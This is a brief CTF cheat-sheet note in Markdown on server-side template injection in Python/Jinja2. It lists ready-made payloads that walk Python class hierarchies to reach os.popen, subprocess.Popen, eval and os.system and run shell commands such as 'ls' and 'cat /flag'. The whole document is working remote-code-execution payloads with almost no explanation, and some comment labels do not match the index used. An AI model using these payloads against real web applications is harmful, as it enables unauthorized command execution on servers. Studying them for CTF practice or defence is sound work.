# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSTI.md
# TITLE: SSTI（服务器端模板注入）
# CATEGORY: web

# os.popen — 最直接 (索引258: os._wrap_close)
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

# subprocess.Popen
{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}

# eval+os.popen
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

# os.system
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')}}
{{[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')}}

# commands (Python 2)
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')}}
